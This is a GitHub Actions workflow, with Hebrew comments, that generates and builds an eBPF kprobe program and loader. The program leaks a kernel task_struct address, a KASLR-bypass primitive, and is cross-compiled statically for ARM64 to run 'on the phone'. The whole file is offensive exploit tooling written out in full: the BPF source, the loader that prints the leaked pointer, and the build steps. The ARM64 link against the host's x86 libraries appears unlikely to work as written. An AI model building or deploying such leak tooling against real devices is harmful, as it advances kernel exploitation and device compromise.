name: build_ebpf_leak
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y clang llvm libbpf-dev libelf-dev zlib1g-dev bpftool gcc-aarch64-linux-gnu

      - name: Build eBPF and Loader
        run: |
          cat << 'EOF' > leak.bpf.c
          #include <linux/bpf.h>
          #include <bpf/bpf_helpers.h>

          struct {
              __uint(type, BPF_MAP_TYPE_ARRAY);
              __uint(max_entries, 1);
              __type(key, __u32);
              __type(value, __u64);
          } leak_map SEC(".maps");

          SEC("kprobe/do_sys_open")
          int leak_kaslr(struct pt_regs *ctx) {
              __u32 key = 0;
              __u64 task = (__u64)bpf_get_current_task();
              bpf_map_update_elem(&leak_map, &key, &task, 0);
              return 0;
          }
          char _license[] SEC("license") = "GPL";
          EOF
          
          # קומפילציה של ה-eBPF
          clang -target bpf -O2 -g -I/usr/include/x86_64-linux-gnu -c leak.bpf.c -o leak.bpf.o
          
          # יצירת קובץ סקלטון אוטומטי
          bpftool gen skeleton leak.bpf.o > leak.skel.h
          
          # קוד ה-Loader
          cat << 'EOF' > leak.c
          #include <stdio.h>
          #include <unistd.h>
          #include "leak.skel.h"

          int main() {
              struct leak_bpf *skel;
              int err;

              skel = leak_bpf__open();
              if (!skel) { fprintf(stderr, "Failed to open BPF skeleton\n"); return 1; }

              err = leak_bpf__load(skel);
              if (err) { fprintf(stderr, "Failed to load BPF skeleton\n"); return 1; }

              err = leak_bpf__attach(skel);
              if (err) { fprintf(stderr, "Failed to attach BPF skeleton\n"); return 1; }

              // הפעלת ה-kprobe
              FILE *f = fopen("/etc/hosts", "r");
              if (f) fclose(f);

              // קריאת התוצאה
              __u32 key = 0;
              __u64 value = 0;
              int map_fd = bpf_map__fd(skel->maps.leak_map);
              bpf_map_lookup_elem(map_fd, &key, &value);

              printf("Leaked task_struct: 0x%llx\n", value);

              leak_bpf__destroy(skel);
              return 0;
          }
          EOF
          
          # קומפילציה סטטית ל-ARM64 (כדי שירוץ על הטלפון)
          aarch64-linux-gnu-gcc -static leak.c -o leak -lbpf -lelf -lz

      - name: Upload leak binary
        uses: actions/upload-artifact@v4
        with:
          name: ebpf-leak
          path: leak
